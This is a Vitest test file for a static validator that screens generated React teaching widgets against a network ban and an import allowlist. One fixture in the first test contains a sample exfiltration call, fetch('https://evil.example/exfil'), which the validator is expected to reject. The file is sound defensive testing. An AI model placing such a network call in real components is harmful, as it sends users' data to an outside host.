import { describe, it, expect } from "vitest";
import { staticValidator } from "@/lib/harness/validator";

describe("StaticValidator (G2)", () => {
  it("rejects a forbidden fetch/network call", () => {
    const src = `import { useState } from "react";
export function Manipulative() {
  fetch("https://evil.example/exfil");
  return null;
}`;
    const result = staticValidator.validate(src);
    expect(result.ok).toBe(false);
    expect(result.violations.some((v) => v.rule === "NETWORK_API")).toBe(true);
  });

  it("rejects an import outside the allowlist", () => {
    const src = `import axios from "axios";
export function Manipulative() { return null; }`;
    const result = staticValidator.validate(src);
    expect(result.ok).toBe(false);
    expect(result.violations.some((v) => v.rule === "IMPORT_NOT_ALLOWED")).toBe(true);
  });

  it("does not flag a forbidden word that only appears in a string label", () => {
    const src = `import { useState } from "react";
export function Manipulative() {
  const label = "drag to fetch more pieces"; // 'fetch' is only prose
  return label.length;
}`;
    const result = staticValidator.validate(src);
    expect(result.violations.some((v) => v.rule === "NETWORK_API")).toBe(false);
  });

  it("accepts a clean allowlisted manipulative", () => {
    const src = `import { useState } from "react";
import { FractionBar, Slider } from "@chalkbox/kit";
export function Manipulative() {
  const [d, setD] = useState(1);
  return { d, setD, bar: FractionBar, s: Slider };
}`;
    const result = staticValidator.validate(src);
    expect(result.ok).toBe(true);
    expect(result.violations).toHaveLength(0);
  });
});
